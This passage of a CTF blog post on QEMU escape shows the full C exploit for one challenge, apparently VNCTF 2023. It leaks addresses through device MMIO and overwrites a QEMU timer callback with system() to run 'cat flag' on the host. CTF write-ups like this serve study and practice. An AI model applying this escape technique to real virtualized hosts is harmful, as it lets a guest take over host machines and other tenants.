class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">read_val</span><span class="params">(<span class="type">int</span> offset)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset + <span class="number">4</span>);</span><br><span class="line">    <span class="type">size_t</span> a = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset);</span><br><span class="line">    <span class="keyword">return</span> (a &lt;&lt; <span class="number">32</span>) + (<span class="type">size_t</span>)mmio_read(<span class="number">0x20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_val</span><span class="params">(<span class="type">uint64_t</span> offset, <span class="type">size_t</span> val)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, (offset &lt;&lt; <span class="number">32</span>) + (val &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, ((offset + <span class="number">4</span>) &lt;&lt; <span class="number">32</span>) + (val &gt;&gt; <span class="number">32</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> elf_base = read_val(<span class="number">-192</span>) - <span class="number">0xf581e0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf_addr = read_val(<span class="number">-184</span>) + <span class="number">0xB40</span>;</span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x312040</span>;</span><br><span class="line">    <span class="type">size_t</span> main_loop_tlg = elf_base + <span class="number">0x14b9480</span>;  </span><br><span class="line">    hexx(<span class="string">&quot;elf_base&quot;</span>, elf_base);</span><br><span class="line">    hexx(<span class="string">&quot;buf_addr&quot;</span>, buf_addr);</span><br><span class="line">    hexx(<span class="string">&quot;main_loop_tlg&quot;</span>, main_loop_tlg);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> timer_list_addr = read_val(main_loop_tlg + <span class="number">8</span> - buf_addr);</span><br><span class="line">    hexx(<span class="string">&quot;timer_list_addr&quot;</span>, timer_list_addr);</span><br><span class="line"></span><br><span class="line">    write_val(<span class="number">8</span>, buf_addr);  <span class="comment">// QEMUTimerList *timer_list</span></span><br><span class="line">    write_val(<span class="number">0x10</span>, system_plt);  <span class="comment">// QEMUTimerCB *cb</span></span><br><span class="line">    write_val(<span class="number">0x18</span>, buf_addr + <span class="number">0x30</span>);  <span class="comment">// void *opaque</span></span><br><span class="line">    write_val(<span class="number">0x30</span>,<span class="number">0x67616c6620746163</span>);  <span class="comment">// cat flag</span></span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x10</span>, timer_list_addr + <span class="number">0x40</span> - buf_addr);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, buf_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://qanux.github.io">Qanux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://qanux.github.io/2024/02/19/qemu%E9%80%83%E9%80%B8/">https://qanux.github.io/2024/02/19/qemu%E9%80%83%E9%80%B8/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/favicon.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/03/15/llvm/" title="llvm pass pwn"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">llvm pass pwn</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/" title="linux kernel"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next</div><div class="next_info">linux kernel</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/favicon.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Qanux</div><div class="author-info__description">I won't pwn.</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">11</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/qanux"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Hello, this is Qanux!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text">一些可以利用的点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E9%87%8D%E8%A6%81%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">一些重要结构体</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">2.</span> <span class="toc-text">常用脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E4%B8%AD%E8%AE%BF%E9%97%AEPCI%E8%AE%BE%E5%A4%87%E7%9A%84mmio%E7%A9%BA%E9%97%B4"><span class="toc-number">2.1.</span> <span class="toc-text">qemu中访问PCI设备的mmio空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#qemu%E4%B8%AD%E8%AE%BF%E9%97%AEPCI%E8%AE%BE%E5%A4%87%E7%9A%84PMIO%E7%A9%BA%E9%97%B4"><span class="toc-number">2.2.</span> <span class="toc-text">qemu中访问PCI设备的PMIO空间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BE%85%E5%8A%A9%E8%84%9A%E6%9C%AC"><span class="toc-number">2.3.</span> <span class="toc-text">辅助脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E5%8C%85%E8%84%9A%E6%9C%AC"><span class="toc-number">2.4.</span> <span class="toc-text">打包脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb%E8%B0%83%E8%AF%95"><span class="toc-number">2.5.</span> <span class="toc-text">gdb调试</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">3.</span> <span class="toc-text">题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E4%BC%97%E6%B5%8B-2019-qemu"><span class="toc-number">3.1.</span> <span class="toc-text">[数字经济众测 2019] qemu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%81%A2%E5%A4%8D%E4%BB%A3%E7%A0%81"><span class="toc-number">3.1.1.</span> <span class="toc-text">恢复代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rfid-class-init"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">rfid_class_init</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rfid-mmio-write"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">rfid_mmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vnln"><span class="toc-number">3.1.1.3.</span> <span class="toc-text">vnln</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">3.1.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B9%96%E6%B9%98%E6%9D%AF-2019-pwn2"><span class="toc-number">3.2.</span> <span class="toc-text">[湖湘杯 2019] pwn2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.1.</span> <span class="toc-text">关键函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#strng-mmio-read"><span class="toc-number">3.2.1.1.</span> <span class="toc-text">strng_mmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strng-mmio-write"><span class="toc-number">3.2.1.2.</span> <span class="toc-text">strng_mmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strng-pmio-read"><span class="toc-number">3.2.1.3.</span> <span class="toc-text">strng_pmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strng-pmio-write"><span class="toc-number">3.2.1.4.</span> <span class="toc-text">strng_pmio_write</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-number">3.2.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HWS-2021-FastCP"><span class="toc-number">3.3.</span> <span class="toc-text">[HWS 2021] FastCP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BA%90%E7%A0%81"><span class="toc-number">3.3.1.</span> <span class="toc-text">关键源码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#fastcp-mmio-read"><span class="toc-number">3.3.1.1.</span> <span class="toc-text">fastcp_mmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastcp-mmio-write"><span class="toc-number">3.3.1.2.</span> <span class="toc-text">fastcp_mmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fastcp-cp-timer"><span class="toc-number">3.3.1.3.</span> <span class="toc-text">fastcp_cp_timer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-number">3.3.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#D3CTF-2021-d3dev"><span class="toc-number">3.4.</span> <span class="toc-text">[D3CTF 2021] d3dev</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%87%BD%E6%95%B0-1"><span class="toc-number">3.4.1.</span> <span class="toc-text">关键函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-mmio-read"><span class="toc-number">3.4.1.1.</span> <span class="toc-text">d3dev_mmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-mmio-write"><span class="toc-number">3.4.1.2.</span> <span class="toc-text">d3dev_mmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-pmio-read"><span class="toc-number">3.4.1.3.</span> <span class="toc-text">d3dev_pmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#d3dev-pmio-write"><span class="toc-number">3.4.1.4.</span> <span class="toc-text">d3dev_pmio_write</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-3"><span class="toc-number">3.4.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-number">3.4.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GACTF2020-babyqemu"><span class="toc-number">3.5.</span> <span class="toc-text">GACTF2020 babyqemu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81"><span class="toc-number">3.5.1.</span> <span class="toc-text">关键代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#denc-mmio-read"><span class="toc-number">3.5.1.1.</span> <span class="toc-text">denc_mmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#denc-mmio-write"><span class="toc-number">3.5.1.2.</span> <span class="toc-text">denc_mmio_write</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#denc-pmio-read"><span class="toc-number">3.5.1.3.</span> <span class="toc-text">denc_pmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#denc-pmio-write"><span class="toc-number">3.5.1.4.</span> <span class="toc-text">denc_pmio_write</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-4"><span class="toc-number">3.5.2.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%BB%93%E6%9E%84%E4%BD%93"><span class="toc-number">3.5.2.1.</span> <span class="toc-text">关键结构体</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-number">3.5.3.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#VNCTF-2023-escape-langlang-mountain2"><span class="toc-number">3.6.</span> <span class="toc-text">[VNCTF 2023] escape_langlang_mountain2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E4%BB%A3%E7%A0%81-1"><span class="toc-number">3.6.1.</span> <span class="toc-text">关键代码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#vn-mmio-read"><span class="toc-number">3.6.1.1.</span> <span class="toc-text">vn_mmio_read</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vn-mmio-write"><span class="toc-number">3.6.1.2.</span> <span class="toc-text">vn_mmio_write</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-5"><span class="toc-number">3.6.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-5"><span class="toc-number">3.6.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/05/05/v8start/" title="初探v8漏洞利用">初探v8漏洞利用</a><time datetime="2024-05-05T11:07:06.040Z" title="Created 2024-05-05 19:07:06">2024-05-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/29/d3ctf2024/" title="D3CTF 2024">D3CTF 2024</a><time datetime="2024-04-28T16:59:35.396Z" title="Created 2024-04-29 00:59:35">2024-04-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/04/17/notes/" title="When ELF notes reveal too much">When ELF notes reveal too much</a><time datetime="2024-04-17T12:18:06.617Z" title="Created 2024-04-17 20:18:06">2024-04-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/03/15/llvm/" title="llvm pass pwn">llvm pass pwn</a><time datetime="2024-03-14T16:00:00.000Z" title="Created 2024-03-15 00:00:00">2024-03-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/02/19/qemu%E9%80%83%E9%80%B8/" title="初探qemu逃逸">初探qemu逃逸</a><time datetime="2024-02-18T16:00:00.000Z" title="Created 2024-02-19 00:00:00">2024-02-19</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Qanux</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.12.0"></script><script src="/js/main.js?v=4.12.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.12.0"></script></div></div></body></html>